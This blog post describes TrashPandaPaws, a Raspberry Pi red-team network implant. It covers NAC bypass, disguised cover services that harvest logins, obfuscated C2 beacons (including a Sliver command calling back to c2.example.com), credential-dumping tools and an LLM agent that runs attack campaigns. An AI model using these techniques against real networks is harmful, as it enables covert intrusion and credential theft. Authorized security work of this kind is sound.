---
layout: post
title: "TrashPandaPaws: A Raspberry Pi Red Team Network Implant"
---

<img width="200" align="left" src="/images/trashpandapaws_logo.png"> Physical implants are the quietest way into a network. Drop a small device inline between a switch port and a legitimate host, let it bridge traffic transparently, and the network barely notices a new participant. TrashPandaPaws is a Raspberry Pi 4 based inline Ethernet tap built for authorized red team engagements. It sits between a switch port and the target device, takes its power from the Ethernet cable or an external PoE switch, bridges all traffic at Layer 2, and phones home through a Sliver C2 beacon while hiding behind a convincing cover identity as either a Cisco IP Phone or an HP LaserJet printer.

The project covers the full stack: a custom PCB for the second Ethernet port, 802.1X NAC bypass, dual cover identities with working protocol emulation, credential harvesting, multi layer persistence, encrypted C2 channels through enterprise proxies, and an optional LLM driven agent mode that plans and runs campaigns inside the operator GUI. Everything runs on ParrotOS ARM64.

The source code lives at [github.com/BenjiTrapp/TrashPandaPaws](https://github.com/BenjiTrapp/TrashPandaPaws).

> TrashPandaPaws is built for authorized red team engagements only. Everything below assumes you have explicit written permission to test the network you are targeting.

> **Updated November 2026.** A lot happened since this post first went up. The hardware story changed completely: a design audit killed the custom PoE HAT, the replacement board is a plain USB 3.0 to Gigabit Ethernet tap, and PoE is now left to the official Raspberry Pi PoE+ HAT or an external switch. On the software side the beacon learned to get through enterprise proxies including NTLMv2 authentication, and the team server gained an autonomous agent mode with an approval gate. The hardware, egress proxy, and automated attack sections below are new or rewritten.

- [How It Works](#how-it-works)
- [Hardware: Three Build Variants](#hardware-three-build-variants)
- [Transparent Bridge and Traffic Capture](#transparent-bridge-and-traffic-capture)
- [802.1X NAC Bypass](#8021x-nac-bypass)
- [Dual Cover Identities](#dual-cover-identities)
- [C2 Integration](#c2-integration)
- [Egress Proxies and NTLM Authentication](#egress-proxies-and-ntlm-authentication)
- [Beacon Generator](#beacon-generator)
- [C2 Team Server](#c2-team-server)
- [Malleable C2 Profiles](#malleable-c2-profiles)
- [Offensive Tool Integration](#offensive-tool-integration)
- [Automated Attack: An Agent Inside the GUI](#automated-attack-an-agent-inside-the-gui)
- [Multi Layer Persistence](#multi-layer-persistence)
- [Remote Access](#remote-access)
- [Credential Capture and Notifications](#credential-capture-and-notifications)
- [Quick Start](#quick-start)
- [Detection and Defense](#detection-and-defense)
- [Further Reading](#further-reading)

## How It Works

The implant sits inline between a switch port and a target device. The upstream port connects to the switch, the downstream port connects to the target, and a transparent Layer 2 bridge ensures all traffic flows through without interruption. Meanwhile, the implant sniffs packets, runs cover services, and maintains a C2 channel back to the operator.

<pre class="mermaid">
flowchart LR
    SW["Switch port\nPoE 802.3af"] -->|Cat6| ETH0["Pi ETH0\nupstream"]
    SW --> POE["PoE power\nPoE+ HAT or switch"]
    POE --> PI["Raspberry Pi 4\nParrotOS ARM64"]
    ETH0 --> BR["L2 Bridge\nbr0"]
    BR --> ETH1["ETH1 downstream\nRTL8153B USB GbE"]
    ETH1 -->|Cat6| TARGET["Target device"]

    BR --> SNIFF["Packet sniffer\nBPF + PCAP"]
    BR --> COVER["Cover identity\nCisco / HP"]
    BR --> C2["Sliver beacon\nmTLS / HTTPS / DNS"]
</pre>

The key design principle is transparency. The bridge forwards all frames including 802.1X authentication, so the target device stays authenticated and the network does not see a topology change. The implant's own traffic exits through the upstream port using the victim's MAC and IP credentials after NAC bypass completes.

## Hardware: Three Build Variants

This is the part of the project that changed the most. The original plan was a single custom HAT that did PoE extraction and the second Ethernet port in one board. A design audit in September 2026 ended that plan, and the hardware now splits into three variants with very different maturity levels.

| | Lite (off the shelf) | v1 (Pi 4 + HAT) | v2 (CM4 carrier) |
|---|---|---|---|
| Custom PCB | none | 1 (`raccoon-tap`, 4 layer) | 1 (4 layer carrier) |
| Boards | Pi + external switch | 2 (stacked) | 1 |
| Size | Pi plus switch box | 85x56 + 58x36mm | 85x56mm |
| Cost | ~95 EUR | ~75 USD + PCB | ~53 USD + PCB |
| PoE | external PoE switch | official Pi PoE+ HAT | on board (design only) |
| Soldering | none | SMD by hand | fine pitch CM4 |
| Status | **works today** | fab package ready, nothing built | design guide and BOM only |

### Lite: The One That Actually Works

The Lite variant is fully off the shelf: a Raspberry Pi 4, a USB 3.0 Gigabit Ethernet adapter, and a UniFi USW-Flex-Mini for power and connectivity. No soldering, no PCB, about 95 EUR, deployable in ten minutes. The UniFi switch itself blends in as a normal network device, which is covert enough for lab work, training, and quick field drops where you are not hiding the device inside a phone enclosure.

<pre class="mermaid">
flowchart LR
    UPLINK["Uplink port\ntarget network"] -->|RJ45| SW2["UniFi USW-Flex-Mini\nPoE powered switch"]
    SW2 -->|eth0| PI["Raspberry Pi 4\nParrotOS ARM64"]
    SW2 -->|PoE splitter or PSU| PI
    PI -->|USB 3.0| ADAPTER["USB GbE adapter\nRTL8153 as eth1"]
    ADAPTER -->|RJ45| TGT["Target device"]
</pre>

The trade is footprint. Two devices instead of one board, and a PoE splitter or USB-C supply for the Pi, so it is not what you hide inside a printer.

### v1: Why the PoE HAT Died

The original `raccoon-hat` was a 65x56mm two layer HAT with an SI3402-B PoE PD controller, a TPS54302 buck converter, an RTL8153B USB GbE controller, and a 2x20 GPIO header. The audit on 2026-09-24 found it not manufacturable as designed:

| Finding | Consequence |
|---------|-------------|
| Schematic carried no usable connectivity, board was unrouted | Nothing to send to a fab house |
| PoE front end built around a PD controller that cannot supply a Pi 4 plus a USB peripheral | Brownouts under load |
| One documented connection would destroy the TPS54302 on power up | Dead board on first plug |
| HR911105A RJ45 MagJack is 10/100 only | No gigabit on the downstream port |

Those files are kept as a record only. They are not generated from the netlist, not covered by the release checks, and marked do not build.

The replacement, `raccoon-tap`, is deliberately narrower in scope: a 58x36mm four layer USB 3.0 to Gigabit Ethernet adapter for the Pi's USB port. RTL8153B-VB-CG controller, AP2112K and SY8089 regulators, ESD protection, RJ45 MagJack, USB-A 3.0 plug. It takes its power from the USB port and has **no PoE stage and no GPIO header** — PoE is now left to the official Raspberry Pi PoE+ HAT or an external PoE switch, which are parts that demonstrably work.

| Property | `raccoon-tap` rev 2.1-draft |
|----------|------------------------------|
| Size and layers | 58x36mm, 4 layer |
| Function | USB 3.0 to Gigabit Ethernet only |
| DRC / ERC | 0 errors, 0 unconnected items, 0 ERC violations |
| Design checks | all 7 checks of `tests/run_design_checks.sh` pass |
| Fab package | PCBWay set in `hardware/fab/`, start with `ORDERING.md` |
| Assembly | PCBWay places U3 and Y1 only, the rest is hand soldered |
| Built and measured | **no** |

The honest status is: routed, frozen, DRC and ERC clean, with a fabrication package that a human could upload tomorrow — and nothing ordered, built, or measured on a bench. Rail currents, the RSET value for the RTL8153B-VB variant, the controller's case temperature, and the crystal drive level are all assumptions until somebody solders one and puts a meter on the test pads. `hardware/OPEN_QUESTIONS.md` lists each of them with the measurement procedure and what to do if the number comes out wrong. That document is worth reading even if you never build the board; it is a good example of writing down what a design rests on instead of pretending it is settled.

### v2: Integrated CM4 Carrier Board

The CM4 variant is still a design on paper. A single 85x56mm four layer PCB with a Compute Module 4 socket, PoE extraction, the RTL8153B USB GbE controller, dual RJ45 connectors, and a USB-C debug port.

<pre class="mermaid">
graph TB
    subgraph V2["V2 integrated carrier board — 85x56mm, design only"]
        CM4["Compute Module 4\nBCM2711 quad A72"]
        POE2["PoE extraction\nSI3402-B + TPS54302"]
        GBE2["RTL8153B\nUSB GbE on-board"]
        RJ1["RJ45 upstream"]
        RJ2["RJ45 downstream"]
        USB["USB-C debug/flash"]
        CM4 --- POE2
        CM4 --- GBE2
        GBE2 --- RJ2
        CM4 --- RJ1
        CM4 --- USB
    end
</pre>

On paper it drops the height to about 10mm and the cost to around 53 USD, which is what makes it attractive for a covert long term drop. Given what the v1 audit found in the PoE front end, treat the design guide and BOM in `hardware/v2-integrated/` as a starting point for a review, not as something to order.

## Transparent Bridge and Traffic Capture

The bridge is the core of the implant. It connects `eth0` (upstream, native Ethernet) and `eth1` (downstream, USB GbE) into a single Layer 2 bridge `br0`. All frames pass through transparently, including EAPOL authentication frames that 802.1X uses.

Traffic capture uses Berkeley Packet Filter expressions to selectively sniff interesting traffic without drowning in broadcast noise. PCAP files rotate automatically for continuous logging without filling the SD card.

```yaml
bridge:
  upstream: eth0
  downstream: eth1
  capture:
    enabled: true
    bpf_filter: "tcp port 80 or tcp port 443 or tcp port 21"
    pcap_rotate_mb: 50
```

The bridge is configured by `configure_bridge.sh` and managed at runtime by `bridge_tap.py`, which handles the BPF filtering and PCAP rotation.

## 802.1X NAC Bypass

Network Access Control using 802.1X is the biggest obstacle for an inline implant. The switch port authenticates the connected device before granting access. If you unplug the legitimate device and plug in the implant, the port shuts down.

TrashPandaPaws solves this in three phases:

<pre class="mermaid">
sequenceDiagram
    participant SW as Switch
    participant IMP as Implant bridge
    participant VIC as Victim device

    Note over SW,VIC: Phase 1 — EAPOL forwarding
    VIC->>IMP: EAPOL Start
    IMP->>SW: EAPOL Start (bridged)
    SW->>IMP: EAP Request
    IMP->>VIC: EAP Request (bridged)
    VIC->>IMP: EAP Response
    IMP->>SW: EAP Response (bridged)
    SW->>IMP: EAP Success
    IMP->>VIC: EAP Success (bridged)

    Note over SW,VIC: Phase 2 — Discovery
    IMP->>IMP: Passive ARP sniffing
    IMP->>IMP: Learn victim MAC + IP
    IMP->>IMP: Learn gateway MAC + IP

    Note over SW,VIC: Phase 3 — Active bypass
    IMP->>SW: Implant traffic with victim MAC + IP
    Note over IMP: ebtables + iptables + arptables rewrite
</pre>

In phase one, the bridge simply forwards all EAPOL frames between the victim and the switch. The victim authenticates normally, and the port stays open. In phase two, the implant passively sniffs ARP traffic to learn the victim's MAC address, IP address, and the gateway's MAC and IP. In phase three, ebtables, iptables, and arptables rules rewrite the implant's outgoing traffic to use the victim's credentials. From the switch's perspective, only the authenticated device is talking.

```yaml
nac_bypass:
  enabled: true
  discovery_timeout: 120
```

## Dual Cover Identities

If someone runs a port scan or browses to the implant's IP, they should see something boring. TrashPandaPaws ships two cover identities that present realistic protocol responses and device metadata.

### Cisco IP Phone 7960

The Cisco cover emulates a VoIP phone. It runs three services:

| Port | Protocol | Behavior |
|------|----------|----------|
| 80 | HTTP | Cisco 7960 web configuration page |
| 5060 | SIP | SIP REGISTER and OPTIONS responses |
| 10000 | RTP | RTP audio stream responses |

The HTTP interface returns a realistic Cisco phone status page with device serial numbers, firmware versions, and network configuration. SIP and RTP handlers respond with protocol correct messages so that a VoIP infrastructure scanner accepts the device as legitimate.

### HP Color LaserJet Pro MFP M478

The printer cover emulates a network multifunction printer with six services:

| Port | Protocol | Behavior |
|------|----------|----------|
| 80 | HTTP | HP Embedded Web Server with printer status |
| 9100 | PJL | JetDirect print job language responses |
| 515 | LPD | Line Printer Daemon |
| 631 | IPP/CUPS | Internet Printing Protocol |
| 161 | SNMP | Printer MIB with toner levels and page counts |
| 23 | Telnet | Management console with login prompt |

Both covers use real vendor OUI ranges for their MAC addresses via `macchanger`, so even a MAC vendor lookup returns the expected manufacturer. Both also include credential harvesting from login attempts and browser fingerprinting that collects Canvas, WebGL, WebRTC, timezone, and plugin data from anyone who visits the HTTP interface.

```yaml
cover:
  enabled: true
  mode: "cisco_phone"    # or "hp_printer"
```

## C2 Integration

The implant runs a Sliver beacon as its primary command and control channel. Sliver is an open source C2 framework that supports multiple transport protocols and is significantly harder to fingerprint than Cobalt Strike. A Python fallback beacon provides autonomous operation if the Sliver binary is unavailable or detected.

All beacon communication uses AES 256 GCM authenticated encryption. Keys can be auto generated, manually set as base64, or derived from the callback URL via SHA 256. The server uses Python's `cryptography` library while the beacon calls OpenSSL via `ctypes`, and both implementations interoperate seamlessly.

The Python beacon supports four transport channels with automatic fallthrough. If one channel fails, it tries the next in order:

<pre class="mermaid">
flowchart TD
    subgraph Implant
        SB["Sliver beacon\nARM64 Linux"]
        PB["Python fallback beacon"]
    end

    subgraph Transports["Transport fallthrough chain"]
        T1["HTTPS\nurllib POST + AES GCM"]
        T2["DNS\nBase32 subdomain queries"]
        T3["SMB\nAnonymous IPC$ named pipes"]
        T4["QUIC style UDP\n1200 byte datagrams"]
        T1 -->|fail| T2
        T2 -->|fail| T3
        T3 -->|fail| T4
    end

    subgraph Operator
        SS["Sliver server"]
        TS["Team server\nFlask + GUI"]
    end

    SB -->|mTLS| SS
    SB -->|HTTPS| SS
    SB -->|DNS| SS
    PB --> T1
    T1 -->|success| TS
    T2 -->|success| TS
    T3 -->|success| TS
    T4 -->|success| TS
</pre>

The Sliver beacon is generated from the operator's server as a native ARM64 Linux binary with mTLS, HTTPS, and DNS transports:

```bash
generate beacon --os linux --arch arm64 \
  --mtls c2.example.com:8888 \
  --http c2.example.com \
  --dns c2.example.com \
  --seconds 300 --jitter 20 \
  --skip-symbols --name raccoon \
  --save ./bin/implant
```

The Python fallback beacon's four channels each have distinct characteristics, and all four are pure stdlib with zero external dependencies:

| Channel | Implementation | Best for |
|---------|---------------|----------|
| **HTTPS** (443/8443) | `urllib` POST with AES GCM body, malleable C2 profiles, proxy auto detection | Default. Blends into normal web traffic |
| **DNS** (53) | Raw socket queries, agent ID Base32 encoded into the subdomain, tasking via encrypted TXT records, ~200 bytes per query | Egress restricted networks, hard to block |
| **SMB** (445) | Full SMB2 stack over an anonymous IPC$ session and a named pipe, configurable pipe name | Internal pivoting between beacons |
| **QUIC style** (UDP 4433) | AES GCM payloads fragmented into 1200 byte datagrams with stream IDs for reassembly | Bypassing TCP only DPI and proxies |

## Egress Proxies and NTLM Authentication

This is the addition that matters most for real enterprise networks: they rarely allow direct outbound connections. A beacon that only knows how to open a socket to port 443 dies at the perimeter.

The beacon now discovers the host's proxy configuration by itself and authenticates against it, including the NTLM case:

| Mode | Behavior |
|------|-----------|
| `auto` | Discover the proxy from environment variables, the Windows registry, GNOME/KDE settings, macOS `scutil`, or PAC/WPAD. Falls back to a direct connection |
| `manual` | Always use the configured proxy URL |
| `none` | Force a direct connection and ignore all environment proxy settings |

The interesting part is NTLM. `urllib` — and WinINet, for that matter — cannot perform NTLM proxy authentication when the account lives in a different AD domain than the proxy. The beacon works around this with an in process loopback relay: it listens on `127.0.0.1` on a random port, performs the full NTLMv2 handshake against the upstream proxy on a single keep alive connection, and then bridges the raw TCP tunnel to the C2.

<pre class="mermaid">
flowchart LR
    B["Beacon\nurllib"] -->|CONNECT to loopback relay| RELAY["NTLM relay\nin-process"]
    RELAY -->|1. CONNECT no auth| PX["Corporate proxy\nNTLM required"]
    PX -->|2. 407 + NTLM offer| RELAY
    RELAY -->|3. Type 1 negotiate| PX
    PX -->|4. 407 + Type 2 challenge| RELAY
    RELAY -->|5. Type 3 authenticate| PX
    PX -->|6. 200 Established| RELAY
    RELAY -->|raw TCP tunnel| SRV["C2 team server"]
</pre>

The whole NTLMv2 implementation is pure stdlib, including MD4, which `hashlib` does not provide. Credentials accept `DOMAIN\user`, `user@domain`, or a separate domain field, and the workstation name defaults to the target's real hostname rather than a static string that would stand out in proxy logs.

```yaml
c2:
  proxy:
    mode: "auto"          # auto | manual | none
    url: ""               # used when mode is manual
    ntlm:
      enabled: true
      host: ""            # empty = reuse the auto-discovered proxy
      port: 8080
      domain: "CORP"      # or inline as "CORP\\alice" in username
      username: "alice"
      password: "secret"
      workstation: ""     # empty = target hostname
```

The `proxyinfo` beacon command confirms which proxy and identity are actually in use at runtime, which saves a lot of guessing when a beacon goes quiet.

## Beacon Generator

The team server GUI generates fully configured payloads rather than making the operator hand edit a template:

| Option | Description |
|--------|-------------|
| Transport selection | Any combination of HTTPS, DNS, SMB, and QUIC with per protocol configuration |
| Encryption | AES 256 GCM with an auto generated or custom base64 key |
| Obfuscation | 1 to 6 layers of nested zlib and base64 with randomized variable names |
| Anti analysis | Sandbox detection (VM artifacts, debugger), process name randomization, jittered sleep |
| Delivery | Inline copy paste one liner, or a private GitHub Gist that auto deletes on the first beacon connect |
| Profile injection | The active malleable C2 profile is baked into the payload at generation time |
| Egress proxy | Proxy mode and optional NTLM credentials baked into the payload |

Each generated payload is unique in structure, and the GUI includes a deobfuscation chain viewer so the operator can verify what was actually produced.

## C2 Team Server

The team server is a Flask based command and control server with an embedded single page operator GUI. It manages encrypted beacon tasking and integrates offensive tools server side rather than pushing binaries to targets.

<pre class="mermaid">
flowchart LR
    subgraph GUI["Operator GUI"]
        DASH["Dashboard"]
        TERM["Interactive terminal\nautocomplete + history"]
        FB["File browser\nupload + download"]
        LOOT["Loot viewer"]
        PROC["Process list\nAV/EDR detection"]
        NET["Network connections\nsecurity assessment"]
        PIVOT["Pivot discovery\nadjacent subnets"]
        LOG["Server logs\nfiltering"]
    end

    subgraph Server["Flask Team Server"]
        API["REST API"]
        TASK["Beacon tasking\nAES 256 GCM"]
        TOOLS["Offensive tools\nserver side"]
    end

    GUI --> API
    API --> TASK
    API --> TOOLS
</pre>

The dashboard provides real time agent management, an interactive terminal with autocomplete and command history, a remote file browser supporting navigation, download, and upload, a loot viewer for collected credentials and files, process listing with automatic AV/EDR detection, network connection parsing with security assessment, pivot discovery for adjacent subnets, and global server log filtering.

The AV/EDR enumeration deserves a note. The server side scanner is based on NetExec's `enum_av` module and remotely detects 35 endpoint protection products through Impacket, using DCERPC `LsarLookupNames`, IPC$ pipe enumeration, and SCM service queries. The beacon also has a local `avenum` command that checks running services, WMI `SecurityCenter2`, firewall rules, AMSI, and AppLocker on the compromised host itself. Knowing what is watching before you do anything loud is the whole point.

A full tour of the GUI with screenshots and a command reference lives in [`docs/C2_DEMO.md`](https://github.com/BenjiTrapp/TrashPandaPaws/blob/main/docs/C2_DEMO.md) — 22 sections captured against a running C2 with a real beacon checked in.

The team server can be deployed standalone or via Docker:

```bash
cd software/c2
docker compose up -d

# Custom configuration
RACCOON_PORT=443 RACCOON_SSL=1 docker compose up -d
```

Environment variables control the server: `RACCOON_PORT` (default 8443), `RACCOON_HOST`, `RACCOON_KEY` (base64 AES 256 GCM key), `RACCOON_DERIVE_KEY` (derive the key from a string via SHA 256), `RACCOON_TOKEN` (operator auth token), and `RACCOON_SSL` with certificate paths. The Docker image runs `python:3.12-slim` with Impacket, NetExec, Lsassy, RelayKing, and Responder pre-installed, using `network_mode: host` and `NET_RAW`/`NET_ADMIN` capabilities for Responder integration. The same compose file carries the optional agent service described further down; neither service declares `depends_on` on the other, so the C2 comes up without the agent and the agent survives a C2 that is not there yet.

## Malleable C2 Profiles

Malleable profiles control how beacon traffic looks on the wire: URIs, headers, User Agent strings, metadata encoding chains, and TLS certificate parameters. Eight built in profiles mimic legitimate cloud services:

| Profile | Mimics |
|---------|--------|
| Amazon CDN | CloudFront distribution traffic |
| Slack API | Slack workspace API calls |
| Google APIs | Google Cloud service requests |
| OneDrive Sync | Microsoft OneDrive file synchronization |
| jQuery CDN | jQuery library CDN requests |
| GitHub API | GitHub REST API interactions |
| Outlook/O365 | Microsoft 365 mail traffic |
| Cloudflare Workers | Cloudflare serverless function calls |

The profile editor in the team server GUI provides syntax highlighting, real time linting, and a seven section tutorial sidebar. Profiles can be generated from captured HTTP traffic by pasting raw Burp Suite request/response pairs and choosing an encoding. Running beacons accept live profile pushes without redeployment, and the operator can verify the result by capturing beacon HTTP requests.

## Offensive Tool Integration

The team server integrates offensive tools server side, keeping binaries off the target. Sixteen Impacket based tools run from the server through beacon sessions, each prompting for target, domain, and credentials or hash:

| Tool | Purpose |
|------|---------|
| PsExec, WMIExec, SMBExec | Remote command execution via SMB service, WMI, or SMB shares |
| AtExec, DcomExec | Remote execution via Task Scheduler or DCOM |
| SecretsDump | Dump SAM, LSA secrets, cached credentials, NTDS.dit |
| Lsassy | Extract credentials from LSASS memory |
| SAMRDump, LookupSID | Enumerate users via SAMR, brute force SID lookup |
| Reg.py | Remote registry operations |
| GetADUsers | Enumerate Active Directory users |
| GetUserSPNs | Kerberoasting — request TGS tickets for SPNs |
| GetNPUsers | AS-REP roasting — find accounts without preauth |
| NTLMRelayx | NTLM relay attack |
| SMBServer | Start an SMB share for file transfer |
| Ticketer | Forge Kerberos tickets (Golden and Silver) |
| Custom | Run any Impacket command |

Beyond Impacket, the server integrates four additional tools:

| Tool | Purpose |
|------|---------|
| NetExec (nxc) | Host enumeration, AV/EDR detection, credential spraying |
| Lsassy | Remote LSASS credential dumping |
| RelayKing | NTLM relay vulnerability auditing |
| Responder | LLMNR, NBT NS, and mDNS poisoning |

### SMBLoot

SMBLoot is a pure Python SMB2 browser built from `socket`, `struct`, `hashlib`, and `hmac` alone. It implements the complete SMB2 protocol stack (negotiate, NTLMv2 auth, tree connect, create, read, query directory) without any external dependencies. This means the operator can browse remote shares, read files, download files, and enumerate directory trees without deploying Impacket on the target.

SMBLoot supports pass the hash authentication via LM:NT format, making it useful when only NTLM hashes are available from credential dumps.

## Automated Attack: An Agent Inside the GUI

The newest and by far the most opinionated addition is an optional LLM driven mode that lives *inside* the operator GUI. The agent plans and runs a campaign against beacons you select, inside a scope you authorize, while you keep using the terminal beside it. Every action is recorded, and the ones that could cost you the drop box or your cover come to you as a question.

It is a separate service that drives the C2 through the same HTTP API an operator uses: it reads the fleet, queues tasks, reads results, records findings, and scores outcomes. It is not a second C2, and it holds no credentials of its own beyond the model's API key and the operator token. It binds loopback and publishes no port, because an API that starts campaigns has no business being reachable from anywhere else.

The important part is that it is not required. The C2 and the beacon run exactly as they do today with no model configured and nothing extra installed, and that is asserted by a test suite (`software/tests/test_status_quo.py`) rather than by a sentence in a README: the C2 must import without the agent package, the agent package must pull in no HTTP library the C2 does not already have, and the C2's requirements must never grow an LLM dependency. With no agent service running, the GUI renders the Automated Attack button greyed out with the reason in its tooltip — not hidden, so you can tell the feature exists and why it is unavailable.

<pre class="mermaid">
flowchart TB
    GUI["Operator GUI\nterminal + agent drawer"] --> C2["Flask C2\nREST API"]
    AG["Agent service\nloopback only"] --> C2
    AG <--> LLM["Model provider\nAnthropic / Bedrock / OpenRouter\nOpenCode Zen / local"]
    AG --> SC["Scope check\nfail-closed"]
    SC --> CL["Classifier\n8 never permitted, 11 gated"]
    CL -->|not gated| RUN["Task queued to beacon"]
    CL -->|gated, supervised| ASK["Operator answers\nin the drawer"]
    CL -->|gated, full automated| EV["EV arbiter\nvalue vs detection cost"]
    ASK --> RUN
    EV --> RUN
</pre>

### Two Modes, One Gate

**Automated Attack** (supervised) is the default: the agent works, you watch, and every gated action asks you in the drawer. The terminal underneath stays yours, so what you type goes out at the next check in regardless of how long the agent's plan is. **Full Automated** is configured and then left alone — no knock reaches you, and an expected value check answers in your place.

The difference is *who decides*, never *whether there is a gate*. The gate is in both modes.

Campaigns can also be scheduled: a cron expression, an overlap guard so a run cannot start while the previous one is still going, and webhook notifications when something finishes or asks for a decision.

### Never Permitted, in Any Mode

Eight actions are refused outright and cannot be approved by you or by the expected value check. They are irreversible and, from a drop box you cannot reach physically, not correctable:

| Key | Why |
|-----|-----|
| `beacon_control` | Beacon lifecycle control is irreversible without an operator |
| `sleep_too_long` | A sleep this long takes the beacon out of reach for hours |
| `dropbox_lifeline` | Touches the bridge, NAC bypass, cover identity, or tunnel |
| `power_off` | Reboot or shutdown of the host carrying the beacon |
| `network_service` | Restarting or disabling networking severs the C2 channel |
| `firewall_change` | Firewall mutation can cut the C2 channel |
| `disk_wipe` | Destroys the filesystem of the host |
| `airmon_check_kill` | `airmon-ng check kill` stops NetworkManager and severs C2 |

Eleven further actions are gated and asked about every time: `device_write_unknown`, `iface_change`, `lsass_dump`, `responder`, `ntlm_relay`, `remote_exec`, `log_clear`, `shadow_copy_delete`, `persist`, `deauth`, and `exploit_known_poc`. The configuration form renders the never permitted list from the same table the gate enforces, so the documentation cannot drift from the behavior.

If nobody answers a knock, the configured behavior decides: `pause` suspends the campaign and keeps the knock on the record, `skip` refuses and records it, `decide` hands it to the expected value check. The default follows the mode — supervised defaults to `pause`, Full Automated to `decide` — and that asymmetry is deliberate: stepping away from a supervised run must not quietly promote the arithmetic into your chair. For one real exploitation request the expected value came out at +110 against a zero threshold, which `decide` would have allowed.

### Phases

<pre class="mermaid">
flowchart LR
    P1["1. Wire intel\nread the bridge capture"] --> P2["2. Orientation\ninterfaces, neighbors, live hosts"]
    P2 --> P3["3. Port + service enum\nopen ports, versions"]
    P3 --> P4["4. OS + vuln fingerprint\nCVE lookup"]
    P4 --> P5["5. Exploitation\noff by default, gated"]
    P5 -.->|max_phase caps at 5| P6["6-8. Wifi survey,\ncapture, crack\nnot reachable yet"]
</pre>

Phase 1 comes first because the quietest source does — reading hosts, protocols, and plaintext credentials out of the bridge capture before sending a single packet is the direct advantage of sitting inline. Exploitation is off by default and only runs against a confirmed service version with a known exploit. The phase labels in the form are the same strings the model is told, from one table in `software/agent/prompts.py`, with a test comparing the two. They used to disagree, which meant clearing a checkbox switched off something other than what it named.

### Risk, OpSec, and the Expected Value Check

A risk profile sets four numbers, each individually overridable:

| Profile | EV threshold | P(detect) start | Detection budget | Risk coefficient R |
|---------|--------------|-----------------|------------------|--------------------|
| passive | +20 | 0.25 | 2 | 50 |
| normal | 0 | 0.15 | 3 | 33 |
| aggressive | −5 | 0.10 | 4 | 25 |

What `aggressive` actually changes is not the set of available actions but the progressive leash. Measured against the finished gate: `passive` reaches 3 of the 11 gated actions unattended and collapses immediately as detections accumulate, `normal` reaches 8 and tightens in steps, `aggressive` reaches the same 8 but never tightens — only the detection budget stops it. No profile makes anti-forensics or backup destruction reachable unattended.

The arbiter's arithmetic is deliberately simple:

```
EV = value_of_what_it_unlocks × P(success) − R × P(detection)_effective
```

Two things people conflate here. `R` is not the score penalty: a detection costs 100 points in the score, while `R` prices what it costs the *run* to be noticed once. And the benefit term is the value of what the action unlocks, not its own score label — which is why `persist` carries 75 rather than 0. An executor may submit its own success estimate, but it is advisory and clamped to ±0.2 of the built in prior, so it cannot rescue an action the check priced as too risky. When that estimate is the only thing lifting an action over the line, the knock card says so.

OpSec profiles are separate: `quiet` disables third party lookups, `normal` allows them, `yolo` lifts the scan rate limits — and *only* the scan rate limits. Tier one actions stay blocked and the approval gate stays in place in every profile, with nine tests guarding that, because the name invites the reading "safety off". `quiet` has one consequence worth knowing: without `lookup_cve` the agent cannot confirm that a known exploit exists unless `searchsploit` is installed on the C2 host, and phase 5's own rule then keeps it out of exploitation.

### Scope Is Fail Closed

A target that cannot be *positively* matched to an allowed range is refused:

```yaml
scope_allow: ["10.0.1.0/24", "10.0.2.0/24"]
scope_deny:  ["10.0.1.254/32"]
```

The surprising consequences are all deliberate:

- A denied `/32` makes any range that contains it refused as well. With `10.0.1.254/32` denied, `nmap 10.0.1.0/24` is refused and so is `10.0.1.250-255`. The agent adapts by naming hosts or sub ranges individually, and the refusals are visible in the stream.
- `--exclude` is not honoured. Trusting a tool's own exclude flag to enforce your deny list means trusting that tool's parser.
- Paths and globs are not targets. `nxc smb /tmp/hosts` and `nmap dc0[1-5].corp.local` are refused; every target must be written out.
- A hostname becomes a target only once a finding ties it to an in scope address. Nothing resolves DNS on the agent's behalf, and if a name maps to several addresses, all of them must be in scope.
- An observation is not an action. The agent records hosts it sees in command output even when they are out of scope, because "everything logged" asks for that, but none of them can become a target.

### Budgets, Rate Limits, and Honest Numbers

| Field | Default | Note |
|-------|---------|------|
| `max_runtime_seconds` | 7200 | Wall clock |
| `max_tokens_total` | 500000 | Roughly one four phase run against one host |
| `campaign_interval` | 15 | Beacon check in during the run |
| `restore_interval` | 300 | Put back afterwards, in the `finally` path |

Measured rather than estimated: 400000 tokens bought phases 2 to 4 against a *single* host, because each parallel executor carries its own transcript. Dropping the check in interval to 15 seconds raises check ins from 12 to 240 an hour, which is what makes the agent usable at all — with the side effect that for `restore_interval` seconds after a run the beacon is asleep, so the next campaign's first command waits that long.

Scan rate limits are applied whether the model asks for them or not: `nmap` gets `-T2 --max-rate 50`, `masscan` gets `--rate 50`, `netdiscover` gets `-c 1`. `-T2` dominates, so 1000 ports take about seven minutes and `-sV` on top takes several more. A request for all 65535 ports is narrowed to nmap's 1000 most common, because at the forced rate the full range is roughly 22 minutes of probing against nmap's 900 second limit — which produced partial results and blocked two campaigns from ever confirming a service version. Telling the model about it was tried first and did not work. Results carry an `effective_command` field whenever a command was rewritten, so the model reports what ran rather than what it asked for.

### Providers and What Gets Recorded

Five providers are supported — Anthropic, Amazon Bedrock, OpenRouter, OpenCode Zen, and a local server such as Ollama, LM Studio, or llama.cpp — and no vendor SDK is installed for any of them; every provider speaks JSON over HTTPS through `requests`, which the C2 already declares.

A capability tier is derived from the model name and limits what a run may do. A model nobody recognizes gets `reduced`, which is the safe direction to be wrong in, and a local endpoint never reaches `full` on its name alone, because the name is whatever you typed and the server behind it may be anything:

| Tier | Orchestrator turns | Executor turns | Output kept | Highest phase |
|------|--------------------|----------------|-------------|---------------|
| `full` | 20 | 16 | 4000 chars | 5 |
| `reduced` | 12 | 8 | 2000 chars | 4 |
| `minimal` | 8 | 6 | 1000 chars | 3 |

Everything the agent does lands in a SQLite database and in the live stream: tasks and results, findings, scored outcomes, detections, every approval request with its classification and EV numbers, and one row per model call with provider, model, token counts, latency, and status. Prompt and response text are **not** stored by default, because a prompt carries scan output that can include credentials recovered from the target — writing that to disk is an explicit choice via `llm_log_level: "full"`.

One more thing the GUI will tell you: a `quiet` OpSec profile combined with a hosted model is a contradiction, because every finding, hostname, and recovered credential still goes to that provider. For a run that leaves nothing behind, use a local provider.

```bash
export RACCOON_TOKEN=...          # must be fixed, not the random per-start one
export AGENT_PROVIDER=anthropic
export AGENT_MODEL=claude-sonnet-4-5
export AGENT_API_KEY=...
cd software/c2 && docker compose up --build
```

